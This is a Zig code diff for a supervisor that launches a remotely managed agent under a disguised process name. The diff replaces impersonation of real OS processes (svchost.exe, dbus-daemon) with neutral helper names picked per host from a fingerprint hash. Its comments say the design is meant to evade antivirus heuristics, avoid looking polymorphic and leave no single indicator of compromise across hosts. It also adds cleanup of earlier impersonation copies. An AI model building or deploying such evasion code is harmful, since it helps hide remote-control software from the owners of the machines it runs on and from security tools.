@@ -790,38 +790,76 @@ fn pushCmdResult(io: Io, id: []const u8, status_: []const u8, detail_: []const u
     g_cmds.unlock(io);
 }
 
-// ---- agent disguise (decoy process name) ----------------------------------
-// To make the supervised agent less obvious in a process list, the rescue runs
-// it from a COPY named like a common system service, picking a fresh name each
-// launch. The agent's identity/binding lives entirely in --data-dir
-// (sys0-agent.id), so the executable name is purely cosmetic — the hub still
-// sees the same node id. Best-effort: on any copy failure we fall back to the
-// plain agent binary.
+// ---- agent disguise (low-key process name) --------------------------------
+// To keep the supervised agent from being trivially obvious in a process list,
+// the rescue runs it from a COPY under a low-key, neutral name. The agent's
+// identity/binding lives entirely in --data-dir (sys0-agent.id), so the
+// executable name is purely cosmetic — the hub still sees the same node id.
+//
+// DELIBERATELY WEAK DISGUISE (anti-AV): we do NOT impersonate real OS processes
+// (svchost.exe, dbus-daemon, …) — that is MITRE ATT&CK T1036.005 Masquerading
+// and a top heuristic-AV trigger. We also do NOT randomize the name per launch:
+// a binary that writes a differently-named executable every run looks like
+// polymorphic malware. Instead we pick ONE neutral "background helper" name
+// DETERMINISTICALLY from the node fingerprint — stable across restarts on a
+// given host (no polymorphism), but varying between hosts (no single-file IOC).
+// The names are plainly not OS components; the goal is "not screaming sys0",
+// not "pretending to be Windows".
 const decoy_names: []const []const u8 = switch (builtin.os.tag) {
+    .windows => &.{ "update-helper.exe", "node-runner.exe", "bg-service.exe", "host-agent.exe", "sync-helper.exe", "app-runner.exe" },
+    .macos => &.{ "update-helper", "node-runner", "bg-service", "host-agent", "sync-helper", "app-runner" },
+    else => &.{ "update-helper", "node-runner", "bg-service", "host-agent", "sync-helper", "app-runner" },
+};
+
+// pickDecoyName chooses a name deterministically from the node fingerprint, so
+// the same host always uses the same decoy name (no per-launch polymorphism)
+// while different hosts differ. Falls back to the first name if no fingerprint.
+fn pickDecoyName(fingerprint: []const u8) []const u8 {
+    if (fingerprint.len == 0) return decoy_names[0];
+    // Simple stable hash over the fingerprint bytes (FNV-1a, 32-bit).
+    var h: u32 = 2166136261;
+    for (fingerprint) |c| {
+        h ^= c;
+        h *%= 16777619;
+    }
+    return decoy_names[@as(usize, h) % decoy_names.len];
+}
+
+// legacy_decoy_names are the real-OS-process names older rescue builds used to
+// impersonate. We delete any leftovers once, since impersonation artifacts are
+// the kind of thing AV flags. Kept separate from the live name list.
+const legacy_decoy_names: []const []const u8 = switch (builtin.os.tag) {
     .windows => &.{ "svchost.exe", "RuntimeBroker.exe", "SearchIndexer.exe", "taskhostw.exe", "sihost.exe", "dllhost.exe", "audiodg.exe" },
     .macos => &.{ "mdworker_shared", "distnoted", "cfprefsd", "trustd", "useractivityd", "secinitd" },
     else => &.{ "dbus-daemon", "pipewire", "udisksd", "gvfsd", "pulseaudio", "gnome-keyring-d", "systemd-userwork" },
 };
 
-fn pickDecoyName(io: Io) []const u8 {
-    var b: [1]u8 = undefined;
-    io.random(&b);
-    return decoy_names[@as(usize, b[0]) % decoy_names.len];
+// sweepLegacyDecoys deletes any old impersonation-named agent copies a previous
+// rescue version may have left in the data dir. Best-effort, runs once at start.
+fn sweepLegacyDecoys(io: Io, data_dir: []const u8) void {
+    const cwd = Io.Dir.cwd();
+    for (legacy_decoy_names) |name| {
+        var path_buf: [std.fs.max_path_bytes]u8 = undefined;
+        const path = std.fmt.bufPrint(&path_buf, "{s}{c}{s}", .{ data_dir, sep, name }) catch continue;
+        cwd.deleteFile(io, path) catch continue;
+        logLine("removed legacy decoy {s}", .{name});
+    }
 }
 
-// prepareDecoy copies the validated agent binary to a fresh system-like name in
-// the data dir and returns its path (allocated). Returns null on any failure so
-// the caller falls back to the plain binary.
-fn prepareDecoy(gpa: std.mem.Allocator, io: Io, data_dir: []const u8, canonical: []const u8) ?[]const u8 {
+// prepareDecoy copies the validated agent binary to a low-key name (chosen
+// deterministically from the fingerprint) in the data dir and returns its path
+// (allocated). Returns null on any failure so the caller falls back to the
+// plain binary.
+fn prepareDecoy(gpa: std.mem.Allocator, io: Io, data_dir: []const u8, canonical: []const u8, fingerprint: []const u8) ?[]const u8 {
     if (!agentLooksValid(io, canonical)) return null;
-    const name = pickDecoyName(io);
+    const name = pickDecoyName(fingerprint);
     const dst = std.fmt.allocPrint(gpa, "{s}{c}{s}", .{ data_dir, sep, name }) catch return null;
     copyExecutable(gpa, io, canonical, dst) catch |err| {
         logLine("decoy copy failed ({s}); using plain agent", .{@errorName(err)});
         gpa.free(dst);
         return null;
     };
-    logLine("agent disguised as {s}", .{name});
+    logLine("agent running as {s}", .{name});
     return dst;
 }
 
@@ -858,11 +896,17 @@ fn pidFromChild(child: *const std.process.Child) i64 {
     return @intCast(id);
 }
 
-fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8) !void {
+fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8, fingerprint: []const u8) !void {
     var backoff: u64 = cfg.min_backoff_ms;
-    // The decoy binary currently in use (a copy of the agent under a system-like
+    // The decoy binary currently in use (a copy of the agent under a low-key
     // name). Cleaned up + regenerated each relaunch.
     var prev_decoy: ?[]const u8 = null;
+
+    // One-time cleanup: older rescue builds impersonated real OS processes and
+    // left those copies behind (svchost.exe, dbus-daemon, …). Those leftover
+    // files are exactly the kind of artifact AV flags, so sweep any that an
+    // earlier version may have dropped in the data dir. Best-effort.
+    sweepLegacyDecoys(io, cfg.data_dir);
 
     while (true) {
         // Clean up the previous run's decoy binary (a renamed copy of the agent)
@@ -902,18 +946,19 @@ fn supervise(io: Io, cfg: Config, gpa: std.mem.Allocator, agent_path: []const u8
         };
         if (needs_dl) traceLine(io, "agent ready ({s})", .{rescue_version});
 
-        // DISGUISE: launch the agent under a system-like decoy name (a copy of
-        // the validated binary), picking a fresh name each launch. The agent's
-        // identity lives in --data-dir (sys0-agent.id), so the rescue<->agent
-        // binding is preserved no matter what the executable is called.
-        const decoy = prepareDecoy(gpa, io, cfg.data_dir, agent_path);
+        // LOW-KEY NAME: launch the agent under a neutral helper name (a copy of
+        // the validated binary), chosen deterministically from the fingerprint
+        // (stable per host, not per launch). The agent's identity lives in
+        // --data-dir (sys0-agent.id), so the rescue<->agent binding is preserved
+        // no matter what the executable is called.
+        const decoy = prepareDecoy(gpa, io, cfg.data_dir, agent_path, fingerprint);
         const spawn_path = decoy orelse agent_path;
         prev_decoy = decoy;
 
         // The decoy file's basename is the disguised process name.
         const disguise = std.fs.path.basename(spawn_path);
         g_status.set(io, .starting_agent, "spawning agent as {s}", .{disguise});
-        traceLine(io, "starting agent (disguised as {s})", .{disguise});
+        traceLine(io, "starting agent as {s}", .{disguise});
 
         const start_ts = Io.Timestamp.now(io, .awake);
 
@@ -1161,5 +1206,5 @@ pub fn main(init: std.process.Init) !void {
         };
     }
 
-    try supervise(io, cfg, gpa, agent_path);
+    try supervise(io, cfg, gpa, agent_path, fingerprint);
 }
